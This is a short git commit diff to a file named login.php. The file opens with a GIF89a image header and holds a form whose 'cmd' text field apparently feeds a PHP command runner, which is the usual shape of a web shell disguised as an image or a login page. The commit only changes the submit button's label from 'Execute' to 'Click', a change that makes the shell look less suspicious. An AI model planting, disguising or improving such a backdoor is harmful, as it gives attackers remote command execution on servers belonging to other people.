a15cefa3055fac3790ff589ac87c307b3ed7ac1c
copph33 <127468834+copph33@users.noreply.github.com>
2023-05-07 18:09:02 +0700

    Update login.php

--- login.php
+++ login.php
@@ -3,7 +3,7 @@ GIF89a;
 <body>
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
 <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
+<input type="SUBMIT" value="Click">
 </form>
 <pre>
 <?php
